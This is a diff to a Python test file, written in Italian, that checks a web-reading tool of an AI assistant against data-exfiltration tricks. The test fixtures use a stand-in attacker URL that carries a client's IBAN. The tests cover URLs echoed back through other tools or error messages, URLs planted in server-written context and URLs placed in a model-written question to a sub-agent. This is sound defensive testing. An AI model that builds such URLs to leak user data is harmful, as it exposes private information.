@@ -127,8 +127,13 @@ def test_controllo_giu_niente_ricerca(s, web_acceso, monkeypatch):
     assert not viste
 
 
-def _evento_strumento(c, url):
-    Evento.objects.create(conversazione=c, tipo=Evento.STRUMENTO, dati={"ruolo": "strumento", "risultati": [{"id": "1", "contenuto": json.dumps({"url": url}), "errore": False}]})
+def _evento_strumento(c, url, nome="cerca_web", argomenti=None, errore=False):
+    """Come li scrive il motore: la chiamata del modello e poi il suo risultato."""
+    n = c.eventi.count()
+    Evento.objects.create(conversazione=c, tipo=Evento.ASSISTENTE, dati={"ruolo": "assistente", "blocchi": [
+        {"tipo": "strumento", "id": f"c{n}", "nome": nome, "argomenti": argomenti or {"query": "q"}}]})
+    Evento.objects.create(conversazione=c, tipo=Evento.STRUMENTO, dati={"ruolo": "strumento", "risultati": [
+        {"id": f"c{n}", "contenuto": json.dumps({"url": url}), "errore": errore}]})
 
 
 def _pagina(html="<html><title>Tit</title><script>segreto()</script><body><p>Testo vero</p></body></html>"):
@@ -157,6 +162,52 @@ def test_una_rete_interna_non_si_apre_neanche_se_comparsa(s, web_acceso, monkeyp
     _evento_strumento(c, "http://metadata.it/x")
     with pytest.raises(ErroreStrumento, match="non aperta"):
         web.leggi_pagina(_ctx(s, c), "http://metadata.it/x", http_client=_pagina())
+
+
+def test_un_indirizzo_fatto_ripetere_da_un_altro_strumento_non_si_apre(s, web_acceso):
+    """Il modello compone l'indirizzo con i dati e se lo fa ripetere («Vista «…» inesistente»), poi prova ad aprirlo."""
+    c = _chat(s)
+    fuga = "https://cattivo.it/c?d=iban-del-cliente"
+    _evento_strumento(c, fuga, nome="descrivi_vista", argomenti={"vista": fuga}, errore=True)
+    _evento_strumento(c, fuga, nome="elenco_viste", argomenti={"app": fuga})
+    _evento_strumento(c, fuga, nome="cerca_web", argomenti={"query": fuga}, errore=True)      # una ricerca non riuscita
+    with pytest.raises(ErroreStrumento, match="esattamente"):
+        web.leggi_pagina(_ctx(s, c), fuga)
+
+
+def test_vale_il_testo_dell_utente_non_il_contesto_scritto_dal_server(s, web_acceso, monkeypatch):
+    monkeypatch.setattr(rete.socket, "getaddrinfo", lambda h, p, **k: [(2, 1, 6, "", ("93.184.216.34", p))])
+    c = _chat(s)
+    Evento.objects.create(conversazione=c, tipo=Evento.UTENTE, dati={"ruolo": "utente", "testo": (
+        "<contesto>\nEsiti delle proposte:\n- Proposta n. 3 «https://cattivo.it/c?d=x»: annullata\n</contesto>\n\n"
+        "Leggi https://x.it/a per favore")})
+    assert web.leggi_pagina(_ctx(s, c), "https://x.it/a", http_client=_pagina())["testo"] == "Testo vero"
+    with pytest.raises(ErroreStrumento, match="esattamente"):
+        web.leggi_pagina(_ctx(s, c), "https://cattivo.it/c?d=x")
+
+
+def test_l_esperto_non_apre_gli_indirizzi_della_domanda_e_ha_il_web_solo_se_scelto(s, web_acceso, monkeypatch):
+    """La domanda all'esperto la scrive il modello: non vale come testo dell'utente. E il turno dell'esperto ha il web
+    solo se l'utente l'ha acceso per quel messaggio (prima nasceva sempre con il web)."""
+    from ai import motore
+    from ai.models import Assistente
+    from ai.strumenti import esperti
+    c = _chat(s)
+    Evento.objects.create(conversazione=c, tipo=Evento.UTENTE, dati={"ruolo": "utente", "testo": "<contesto>\n</contesto>\n\nApri https://cattivo.it/c?d=x"})
+    interno = Turno.objects.create(conversazione=c, utente=s["u"], azienda=s["az"], compito="esperto")
+    with pytest.raises(ErroreStrumento, match="esattamente"):
+        web.leggi_pagina(Contesto(utente=s["u"], azienda=s["az"], conversazione=c, turno=interno), "https://cattivo.it/c?d=x")
+    Assistente.objects.create(nome="Fiscale", descrizione="x")
+    visti = []
+
+    def avvia(conversazione, testo, utente, azienda=None, **opzioni):
+        visti.append(opzioni["web"])
+        return Turno.objects.create(conversazione=conversazione, utente=utente, stato=Turno.COMPLETATO, testo="ok")
+    monkeypatch.setattr(motore, "avvia", avvia)
+    for acceso in (False, True):
+        chiamante = Turno.objects.create(conversazione=c, utente=s["u"], azienda=s["az"], web=acceso, stato=Turno.COMPLETATO)
+        esperti.chiedi_esperto(Contesto(utente=s["u"], azienda=s["az"], conversazione=c, turno=chiamante), "Fiscale", "Che cosa dice la norma?")
+    assert visti == [False, True]
 
 
 def test_indirizzo_di_un_altra_chat_non_vale(s, web_acceso):
